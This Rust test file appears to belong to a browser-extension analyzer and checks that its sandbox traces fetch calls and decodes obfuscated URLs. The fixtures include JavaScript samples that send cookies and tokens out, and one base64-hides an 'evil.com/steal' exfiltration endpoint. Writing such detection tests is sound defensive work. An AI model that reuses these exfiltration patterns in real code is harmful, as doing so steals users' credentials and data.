use extanalyzer::analyze::code_extractor::extract_fetch_snippets;
use extanalyzer::analyze::sandbox_analysis::{analyze_endpoints_with_sandbox, SandboxAnalysisConfig};
use extanalyzer::models::{DataSource, Endpoint, ExtensionFile, FileType, HttpMethod, Location};
use std::path::PathBuf;

#[test]
fn test_sandbox_traces_fetch_with_body() {
    let js_code = r#"
function sendUserData(userId, token) {
    fetch("https://api.example.com/collect", {
        method: "POST",
        body: JSON.stringify({ userId: userId, token: token })
    });
}
"#;

    let file_path = PathBuf::from("background.js");
    let files = vec![ExtensionFile {
        path: file_path.clone(),
        file_type: FileType::JavaScript,
        content: Some(js_code.to_string()),
    }];

    let mut endpoints = vec![Endpoint::new(
        "https://api.example.com/collect".to_string(),
        Location {
            file: file_path,
            line: Some(3),
            column: None,
        },
    )
    .with_method(HttpMethod::Post)
    .with_data_sources(vec![
        DataSource::Unknown("userId".to_string()),
        DataSource::Unknown("token".to_string()),
    ])];

    analyze_endpoints_with_sandbox(&mut endpoints, &files, &SandboxAnalysisConfig::default());

    assert!(endpoints[0].sandbox_trace.is_some());
    let trace = endpoints[0].sandbox_trace.as_ref().unwrap();
    assert!(!trace.fetch_calls.is_empty());
    assert_eq!(trace.fetch_calls[0].url, "https://api.example.com/collect");
    assert_eq!(trace.fetch_calls[0].method, Some("POST".to_string()));
    // Body should contain the JSON structure
    assert!(trace.fetch_calls[0].body.is_some());
}

#[test]
fn test_sandbox_decodes_obfuscated_url() {
    let js_code = r#"
function exfiltrate(data) {
    var url = atob("aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==");
    fetch(url, { method: "POST", body: data });
}
"#;

    let file_path = PathBuf::from("content.js");
    let files = vec![ExtensionFile {
        path: file_path.clone(),
        file_type: FileType::JavaScript,
        content: Some(js_code.to_string()),
    }];

    // Static analysis might not find the URL, but let's pretend it found a placeholder
    let mut endpoints = vec![Endpoint::new(
        "https://evil.com/steal".to_string(),
        Location {
            file: file_path,
            line: Some(4),
            column: None,
        },
    )
    .with_method(HttpMethod::Post)
    .with_data_sources(vec![DataSource::Unknown("data".to_string())])];

    analyze_endpoints_with_sandbox(&mut endpoints, &files, &SandboxAnalysisConfig::default());

    let trace = endpoints[0].sandbox_trace.as_ref().unwrap();
    // Should have decoded the base64 URL
    assert!(!trace.decoded_strings.is_empty());
    assert!(trace.decoded_strings.iter().any(|s| s.contains("evil.com")));
}

#[test]
fn test_sandbox_skips_endpoints_with_known_sources() {
    let js_code = r#"
function sendCookie() {
    fetch("https://api.example.com/data", {
        body: document.cookie
    });
}
"#;

    let file_path = PathBuf::from("script.js");
    let files = vec![ExtensionFile {
        path: file_path.clone(),
        file_type: FileType::JavaScript,
        content: Some(js_code.to_string()),
    }];

    // This endpoint has a known source (Cookie), not Unknown
    let mut endpoints = vec![Endpoint::new(
        "https://api.example.com/data".to_string(),
        Location {
            file: file_path,
            line: Some(3),
            column: None,
        },
    )
    .with_data_sources(vec![DataSource::Cookie(None)])];

    analyze_endpoints_with_sandbox(&mut endpoints, &files, &SandboxAnalysisConfig::default());

    // Should not have sandbox trace since sources are already known
    assert!(endpoints[0].sandbox_trace.is_none());
}

#[test]
fn test_code_extractor_finds_fetch_in_nested_function() {
    let js_code = r#"
(function() {
    function inner() {
        fetch("https://api.test.com/endpoint");
    }
    inner();
})();
"#;

    let snippets = extract_fetch_snippets(js_code, &PathBuf::from("test.js"));
    assert_eq!(snippets.len(), 1);
    assert!(snippets[0].code.contains("inner"));
}
